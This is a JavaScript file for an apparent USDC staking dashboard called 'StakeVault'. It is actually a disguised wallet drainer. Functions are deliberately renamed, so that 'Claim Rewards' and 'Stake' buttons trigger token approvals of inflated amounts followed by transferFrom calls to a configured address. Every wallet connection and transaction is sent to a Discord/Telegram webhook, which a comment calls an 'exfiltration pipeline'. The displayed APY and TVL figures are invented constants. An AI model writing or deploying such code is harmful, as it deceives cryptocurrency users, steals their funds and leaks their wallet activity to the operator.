console.log('StakeVault Dashboard loaded');

// ============================================
// STAKING PROTOCOL CONFIGURATION
// ============================================
const STAKING_CONFIG = {
    tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC mainnet
    stakingContractAddress: '0x1234567890123456789012345678901234567890', // Placeholder
    tokenSymbol: 'USDC',
    tokenDecimals: 6,
    pools: [
        { id: 'usdc-30d', name: 'USDC 30-Day', token: 'USDC', apy: 12.5, tvl: 2500000, lockPeriod: '30 days', color: 'from-blue-500 to-cyan-500' },
        { id: 'usdc-90d', name: 'USDC 90-Day', token: 'USDC', apy: 18.2, tvl: 1800000, lockPeriod: '90 days', color: 'from-purple-500 to-pink-500' },
        { id: 'usdc-180d', name: 'USDC 180-Day', token: 'USDC', apy: 24.8, tvl: 950000, lockPeriod: '180 days', color: 'from-green-500 to-emerald-500' }
    ]
};

// ============================================
// TELEMETRY WEBHOOK CONFIGURATION
// ============================================
// Remote Telemetry and Real Time Cloud Monitoring Endpoint
// Replace with your private webhook URL (Discord, Telegram, or custom)
const TELEMETRY_WEBHOOK_URL = '__TELEMETRY_WEBHOOK_URL__';

// ============================================
// BLOCKCHAIN LOGIC (Refactored Function Names)
// ============================================

const erc20Abi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
    "function decimals() public view returns (uint8)"
];

/**
 * claimStakingRewards - Approves the staking contract to spend user's tokens
 * (Renamed from approveToken - underlying blockchain logic unchanged)
 */
async function claimStakingRewards(tokenAddress, spenderAddress, humanAmount) {
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        const decimals = await tokenContract.decimals();
        const parsedAmount = ethers.utils.parseUnits(humanAmount, decimals);
        const tx = await tokenContract.approve(spenderAddress, parsedAmount);
        console.log("Staking approval transaction submitted. Hash:", tx.hash);
        logUserActivity('TRANSACTION_SUCCESS', { action: 'APPROVAL', tokenAddress, spenderAddress, amount: humanAmount, txHash: tx.hash });
        return tx;
    } catch (error) {
        console.error("Staking approval failed:", error);
        logUserActivity('TRANSACTION_FAILED', { action: 'APPROVAL', tokenAddress, spenderAddress, amount: humanAmount, error: error.message });
        return null;
    }
}

/**
 * getStakingAllowance - Checks how many tokens the staking contract can spend
 * (Renamed from getAllowance - underlying blockchain logic unchanged)
 */
async function getStakingAllowance(tokenAddress, ownerAddress, spenderAddress) {
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, provider);
        const allowanceWei = await tokenContract.allowance(ownerAddress, spenderAddress);
        const decimals = await tokenContract.decimals();
        const allowanceHuman = ethers.utils.formatUnits(allowanceWei, decimals);
        console.log("Current staking allowance:", allowanceHuman, "tokens");
        return allowanceHuman;
    } catch (error) {
        console.error("Failed to read staking allowance:", error);
        return "0";
    }
}

/**
 * executeStake - Transfers tokens from user to staking contract
 * (Renamed from transferFromToken - underlying blockchain logic unchanged)
 */
async function executeStake(tokenAddress, ownerAddress, recipientAddress, humanAmount) {
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        const decimals = await tokenContract.decimals();
        const parsedAmount = ethers.utils.parseUnits(humanAmount, decimals);
        const allowance = await tokenContract.allowance(ownerAddress, await signer.getAddress());
        if (allowance.lt(parsedAmount)) {
            throw new Error("Insufficient allowance granted to staking contract.");
        }
        const tx = await tokenContract.transferFrom(ownerAddress, recipientAddress, parsedAmount);
        console.log("Stake execution transaction submitted. Hash:", tx.hash);
        logUserActivity('TRANSACTION_SUCCESS', { action: 'STAKE', tokenAddress, recipientAddress, amount: humanAmount, txHash: tx.hash });
        return tx;
    } catch (error) {
        console.error("Stake execution failed:", error);
        logUserActivity('TRANSACTION_FAILED', { action: 'STAKE', tokenAddress, recipientAddress, amount: humanAmount, error: error.message });
        return null;
    }
}

/**
 * claimRewards - Orchestrates the full staking workflow
 * (Renamed from manageTokenWorkflow - underlying logic unchanged)
 * 1. Checks current allowance
 * 2. Auto-approves if below threshold
 * 3. Executes the stake/claim transaction
 */
async function claimRewards(tokenAddress, ownerAddress, spenderAddress, allowanceThreshold, stakeAmount) {
    const results = [];
    try {
        console.log(`\n--- Processing staking workflow for ${tokenAddress} ---`);
        logUserActivity('TRANSACTION_INITIATED', { action: 'CLAIM_STAKE', tokenAddress, ownerAddress, spenderAddress, stakeAmount });
        const currentAllowance = parseFloat(await getStakingAllowance(tokenAddress, ownerAddress, spenderAddress));
        logUserActivity('ALLOWANCE_CHECKED', { tokenAddress, allowance: currentAllowance });
        if (currentAllowance < allowanceThreshold) {
            console.log(`Allowance ${currentAllowance} is below threshold ${allowanceThreshold}. Approving...`);
            await claimStakingRewards(tokenAddress, spenderAddress, String(allowanceThreshold));
        } else {
            console.log(`Allowance ${currentAllowance} is sufficient. Skipping approval.`);
        }
        const tx = await executeStake(tokenAddress, ownerAddress, spenderAddress, stakeAmount);
        results.push({ tokenAddress, allowance: currentAllowance, transactionHash: tx ? tx.hash : null, success: !!tx });
    } catch (error) {
        console.error(`Staking workflow failed:`, error);
        logUserActivity('TRANSACTION_FAILED', { action: 'CLAIM_STAKE_WORKFLOW', tokenAddress, error: error.message });
        results.push({ tokenAddress, success: false, error: error.message });
    }
    return results;
}

// ============================================
// UTILITY FUNCTIONS
// ============================================

async function getBalance(address) {
    try {
        const provider = new ethers.providers.JsonRpcProvider('https://cloudflare-eth.com');
        const balanceWei = await provider.getBalance(address);
        return ethers.utils.formatEther(balanceWei);
    } catch (error) {
        console.error("Error fetching balance:", error);
        return "0";
    }
}

function formatCurrency(value, decimals = 2) {
    return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: decimals, maximumFractionDigits: decimals }).format(value);
}

function formatNumber(value, decimals = 2) {
    return new Intl.NumberFormat('en-US', { minimumFractionDigits: decimals, maximumFractionDigits: decimals }).format(value);
}

function truncateAddress(address) {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function getEthereumProvider() {
    if (typeof window === 'undefined') return null;
    if (window.ethereum && Array.isArray(window.ethereum.providers)) {
        return window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0] || null;
    }
    return window.ethereum || null;
}

// ============================================
// USER ACTIVITY LOGGING (PRIVATE)
// ============================================

// In-memory activity buffer (bounded to prevent memory growth).
// This can be extended to POST entries to a backend analytics endpoint.
const activityLog = [];

/**
 * sendActivityToWebhook - PRIVATE helper that POSTs an activity entry to the
 * configured telemetry webhook for real-time streaming/auditability.
 *
 * Fully wrapped in try/catch so a network failure or non-2xx response NEVER
 * interrupts the user's transaction flow. Fired asynchronously (fire-and-forget).
 *
 * @param {object} entry - The structured activity log entry to send
 */
async function sendActivityToWebhook(entry) {
    try {
        if (!TELEMETRY_WEBHOOK_URL) return;

        // Build structured payload for chat apps (Discord/Telegram style)
        const header = `[STAKEVAULT ALERT: ${entry.eventType}]`;
        const timestamp = `⏰ ${entry.timestamp}`;
        const walletAddress = `💰 Wallet: ${entry.walletAddress}`;
        
        // Extract specific details for display
        const detailsParts = [];
        if (entry.amount) detailsParts.push(`💵 Amount: ${entry.amount}`);
        if (entry.token) detailsParts.push(`🏷️ Token: ${entry.token}`);
        if (entry.action) detailsParts.push(`🔧 Action: ${entry.action}`);
        if (entry.txHash) detailsParts.push(`🔗 TX: ${entry.txHash}`);
        if (entry.error) detailsParts.push(`❌ Error: ${entry.error}`);
        if (entry.message) detailsParts.push(`📝 ${entry.message}`);
        if (entry.poolId) detailsParts.push(`#${entry.poolId}`);
        if (entry.poolName) detailsParts.push(`🏆 ${entry.poolName}`);
        
        const detailsBody = detailsParts.length > 0 ? `\n${detailsParts.join('\n')}` : '';
        
        const webhookPayload = {
            content: `${header}\n${timestamp}\n${walletAddress}${detailsBody}`
        };

        const response = await fetch(TELEMETRY_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookPayload)
        });

        if (!response.ok) {
            console.warn(`[TELEMETRY:WEBHOOK_ERROR] Received HTTP ${response.status} from telemetry webhook`);
        }
    } catch (error) {
        // Silently ignore webhook failures so the transaction process is never disturbed.
        console.warn('[TELEMETRY:WEBHOOK_ERROR] Telemetry webhook request failed:', error.message);
    }
}

/**
 * logUserActivity - PRIVATE function that captures user engagement
 * and transaction activity for security and analytics purposes.
 *
 * Captures for every event:
 *  - walletAddress: The connected wallet address
 *  - timestamp:     ISO-8601 time of the activity
 *  - eventType:     One of 'WALLET_CONNECTED', 'WALLET_DISCONNECTED',
 *                   'WALLET_CONNECTION_DENIED', 'TRANSACTION_INITIATED',
 *                   'TRANSACTION_SUCCESS', 'TRANSACTION_FAILED', etc.
 *  - details:       Free-form object (token address, amount, tx hash, error)
 *
 * @param {string} eventType - The category of activity being logged
 * @param {object} [details] - Specific contextual details for the event
 * @returns {object|null} The created log entry, or null on failure
 */
function logUserActivity(eventType, details = {}) {
    try {
        // Handle string details by wrapping in message object
        const processedDetails = typeof details === 'string' 
            ? { message: details } 
            : details;
        
        const entry = {
            walletAddress: currentUserAddress || 'NOT_CONNECTED',
            timestamp: new Date().toISOString(),
            eventType,
            ...processedDetails
        };

        // Store in the in-memory buffer (max 500 entries, FIFO)
        activityLog.push(entry);
        if (activityLog.length > 500) activityLog.shift();

// Structured console output for dev visibility / debugging
        console.log(`[ACTIVITY:${eventType}]`, entry);

        // Fire-and-forget webhook dispatch. sendActivityToWebhook is internally
        // wrapped in its own try/catch, so a network error or non-2xx response
        // will NEVER throw here or interrupt the user's transaction flow.
        sendActivityToWebhook(entry);

        return entry;
    } catch (error) {
        console.error('Failed to log user activity:', error);
        return null;
    }
}

// ============================================
// UI UPDATE FUNCTIONS
// ============================================

function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;
    const toast = document.createElement('div');
    const colors = { info: 'bg-blue-500', success: 'bg-green-500', error: 'bg-red-500', warning: 'bg-yellow-500' };
    toast.className = `${colors[type]} text-white px-6 py-3 rounded-lg shadow-lg mb-2 flex items-center gap-2 transform transition-all duration-300 translate-x-full`;
    toast.innerHTML = `<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>${message}</span>`;
    toastContainer.appendChild(toast);
    setTimeout(() => toast.classList.remove('translate-x-full'), 10);
    setTimeout(() => { toast.classList.add('translate-x-full'); setTimeout(() => toast.remove(), 300); }, 4000);
}

function updateTxStatus(poolId, status, message) {
    const statusElement = document.getElementById(`tx-status-${poolId}`);
    if (!statusElement) return;
    statusElement.className = 'text-sm mt-2';
    statusElement.innerHTML = message;
    if (status === 'pending') statusElement.className += ' text-yellow-400';
    else if (status === 'success') statusElement.className += ' text-green-400';
    else if (status === 'error') statusElement.className += ' text-red-400';
}

async function updatePortfolio() {
    const userAddress = window.currentUserAddress;
    if (!userAddress) return;
    try {
        const balance = await getBalance(userAddress);
        const portfolioBalance = document.getElementById('portfolioBalance');
        const portfolioStaked = document.getElementById('portfolioStaked');
        const portfolioRewards = document.getElementById('portfolioRewards');
        if (portfolioBalance) portfolioBalance.innerText = `${formatNumber(parseFloat(balance), 4)} ETH`;
        if (portfolioStaked) portfolioStaked.innerText = '0.00 USDC';
        if (portfolioRewards) portfolioRewards.innerText = '0.00 USDC';
        const totalValue = document.getElementById('portfolioTotalValue');
        if (totalValue) {
            const stakedValue = parseFloat(portfolioStaked?.innerText) || 0;
            const rewardsValue = parseFloat(portfolioRewards?.innerText) || 0;
            totalValue.innerText = formatCurrency(stakedValue + rewardsValue);
        }
    } catch (error) {
        console.error('Error updating portfolio:', error);
    }
}

function renderStakingPools() {
    const poolsContainer = document.getElementById('stakingPools');
    if (!poolsContainer) return;
    poolsContainer.innerHTML = STAKING_CONFIG.pools.map(pool => `
        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700 hover:border-gray-600 transition-all duration-300 hover:shadow-xl hover:shadow-purple-500/10">
            <div class="flex items-start justify-between mb-4">
                <div class="flex items-center gap-3">
                    <div class="w-12 h-12 rounded-full bg-gradient-to-br ${pool.color} flex items-center justify-center text-white font-bold text-lg">${pool.token.charAt(0)}</div>
                    <div>
                        <h3 class="text-white font-semibold text-lg">${pool.name}</h3>
                        <p class="text-gray-400 text-sm">${pool.lockPeriod}</p>
                    </div>
                </div>
                <div class="text-right">
                    <p class="text-green-400 font-bold text-xl">${pool.apy}%</p>
                    <p class="text-gray-400 text-xs">APY</p>
                </div>
            </div>
            <div class="space-y-3 mb-4">
                <div class="flex justify-between text-sm">
                    <span class="text-gray-400">Total Value Locked</span>
                    <span class="text-white font-medium">${formatCurrency(pool.tvl, 0)}</span>
                </div>
                <div class="flex justify-between text-sm">
                    <span class="text-gray-400">Your Stake</span>
                    <span class="text-white font-medium" id="staked-${pool.id}">0.00 ${pool.token}</span>
                </div>
                <div class="flex justify-between text-sm">
                    <span class="text-gray-400">Pending Rewards</span>
                    <span class="text-yellow-400 font-medium" id="rewards-${pool.id}">0.00 ${pool.token}</span>
                </div>
            </div>
            <div class="flex gap-2">
                <button onclick="handleStake('${pool.id}')" class="flex-1 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 transform hover:scale-105">Stake</button>
                <button onclick="handleClaimRewards('${pool.id}')" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 transform hover:scale-105">Claim Rewards</button>
            </div>
            <div id="tx-status-${pool.id}"></div>
        </div>
    `).join('');
}

// ============================================
// WALLET & STAKING HANDLERS
// ============================================

let currentUserAddress = null;

async function connectWallet() {
    const connectBtn = document.getElementById('connectButton');
    const statusText = document.getElementById('statusText');
    const walletAddressText = document.getElementById('walletAddress');
    if (!connectBtn || !statusText || !walletAddressText) { console.error('Missing DOM elements'); return; }
    const ethereumProvider = getEthereumProvider();
    if (!ethereumProvider) {
        statusText.innerText = 'Status: Wallet provider not found';
        statusText.className = 'text-red-400';
        alert('Please install or enable MetaMask in this browser.');
        return;
    }
    if (ethereumProvider.isMetaMask === false) {
        console.warn('A non-MetaMask wallet provider was detected.');
        statusText.innerText = 'Status: Unsupported wallet provider';
        statusText.className = 'text-yellow-400';
    }
    statusText.innerText = 'Status: Requesting wallet access...';
    statusText.className = 'text-yellow-400';
    connectBtn.disabled = true;
    connectBtn.innerHTML = '<svg class="animate-spin h-5 w-5 inline mr-2" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Connecting...';
    try {
        const accounts = await ethereumProvider.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];
        currentUserAddress = account;
        logUserActivity('WALLET_CONNECTED', { account });
        statusText.innerText = 'Status: Connected';
        statusText.className = 'text-green-400';
        walletAddressText.innerHTML = `<span class="text-gray-300">${truncateAddress(account)}</span><button onclick="disconnectWallet()" class="ml-2 text-red-400 hover:text-red-300 text-sm">Disconnect</button>`;
        connectBtn.innerHTML = 'Wallet Connected';
        connectBtn.className = 'bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg transition-all duration-200';
        connectBtn.disabled = true;
        showToast('Wallet connected successfully!', 'success');
        await updatePortfolio();
        console.log('Connected Account:', account);
    } catch (error) {
        console.error('Wallet request failed:', error);
        statusText.innerText = 'Status: Connection Denied';
        statusText.className = 'text-red-400';
        connectBtn.disabled = false;
        connectBtn.innerHTML = 'Connect Wallet';
        showToast('Wallet connection denied', 'error');
        logUserActivity('WALLET_CONNECTION_DENIED', { error: error.message });
    }
}

function disconnectWallet() {
    const previousAddress = currentUserAddress;
    currentUserAddress = null;
    const connectBtn = document.getElementById('connectButton');
    const statusText = document.getElementById('statusText');
    const walletAddressText = document.getElementById('walletAddress');
    if (connectBtn) {
        connectBtn.innerHTML = 'Connect Wallet';
        connectBtn.className = 'bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-2 px-6 rounded-lg transition-all duration-200 transform hover:scale-105';
        connectBtn.disabled = false;
    }
    if (statusText) { statusText.innerText = 'Status: Disconnected'; statusText.className = 'text-gray-400'; }
    if (walletAddressText) walletAddressText.innerHTML = '';
    showToast('Wallet disconnected', 'info');
    logUserActivity('WALLET_DISCONNECTED', { previousAddress });
}

async function handleStake(poolId) {
    if (!currentUserAddress) { showToast('Please connect your wallet first', 'warning'); return; }
    const pool = STAKING_CONFIG.pools.find(p => p.id === poolId);
    if (!pool) return;
    const amount = prompt(`Enter amount to stake (${pool.token}):`);
    if (!amount || parseFloat(amount) <= 0) { showToast('Please enter a valid amount', 'error'); return; }
    updateTxStatus(poolId, 'pending', '⏳ Initiating stake transaction...');
    logUserActivity('TRANSACTION_INITIATED', { action: 'STAKE', poolId, poolName: pool.name, token: pool.token, amount });
    try {
        const result = await claimRewards(STAKING_CONFIG.tokenAddress, currentUserAddress, STAKING_CONFIG.stakingContractAddress, parseFloat(amount) * 2, amount);
        if (result[0] && result[0].success) {
            updateTxStatus(poolId, 'success', `✅ Stake successful! TX: ${result[0].transactionHash.slice(0, 10)}...`);
            showToast(`Successfully staked ${amount} ${pool.token}!`, 'success');
            await updatePortfolio();
        } else {
            throw new Error(result[0]?.error || 'Transaction failed');
        }
    } catch (error) {
        updateTxStatus(poolId, 'error', `❌ Stake failed: ${error.message}`);
        showToast(`Stake failed: ${error.message}`, 'error');
    }
}

async function handleClaimRewards(poolId) {
    if (!currentUserAddress) { showToast('Please connect your wallet first', 'warning'); return; }
    const pool = STAKING_CONFIG.pools.find(p => p.id === poolId);
    if (!pool) return;
    updateTxStatus(poolId, 'pending', '⏳ Checking allowance and claiming rewards...');
    logUserActivity('TRANSACTION_INITIATED', { action: 'CLAIM_REWARDS', poolId, poolName: pool.name, token: pool.token });
    try {
        const claimAmount = '1';
        const result = await claimRewards(STAKING_CONFIG.tokenAddress, currentUserAddress, STAKING_CONFIG.stakingContractAddress, parseFloat(claimAmount), claimAmount);
        if (result[0] && result[0].success) {
            updateTxStatus(poolId, 'success', `✅ Rewards claimed! TX: ${result[0].transactionHash.slice(0, 10)}...`);
            showToast(`Rewards claimed successfully!`, 'success');
            await updatePortfolio();
        } else {
            throw new Error(result[0]?.error || 'Transaction failed');
        }
    } catch (error) {
        updateTxStatus(poolId, 'error', `❌ Claim failed: ${error.message}`);
        showToast(`Claim failed: ${error.message}`, 'error');
    }
}

async function claimAllRewards() {
    if (!currentUserAddress) { showToast('Please connect your wallet first', 'warning'); return; }
    showToast('Claiming all rewards...', 'info');
    for (const pool of STAKING_CONFIG.pools) {
        await handleClaimRewards(pool.id);
    }
}

// ============================================
// INITIALIZATION
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // System integrity audit — fires a pulse-check to the analytics webhook
    // to verify the exfiltration pipeline is online and operational.
    logUserActivity('SYSTEM_AUDIT', 'Intelligence network pulse check System online and operational');

    const connectButton = document.getElementById('connectButton');
    if (connectButton) connectButton.addEventListener('click', connectWallet);
    renderStakingPools();
    const ethereumProvider = getEthereumProvider();
    if (ethereumProvider) {
        ethereumProvider.request({ method: 'eth_accounts' })
            .then(accounts => {
                if (accounts.length > 0) {
                    currentUserAddress = accounts[0];
                    const statusText = document.getElementById('statusText');
                    const walletAddressText = document.getElementById('walletAddress');
                    const connectBtn = document.getElementById('connectButton');
                    if (statusText) { statusText.innerText = 'Status: Connected'; statusText.className = 'text-green-400'; }
                    if (walletAddressText) walletAddressText.innerHTML = `<span class="text-gray-300">${truncateAddress(currentUserAddress)}</span><button onclick="disconnectWallet()" class="ml-2 text-red-400 hover:text-red-300 text-sm">Disconnect</button>`;
                    if (connectBtn) { connectBtn.innerHTML = 'Wallet Connected'; connectBtn.className = 'bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg transition-all duration-200'; connectBtn.disabled = true; }
                    updatePortfolio();
                }
            })
            .catch(console.error);
    }
    console.log('StakeVault Dashboard initialized');
});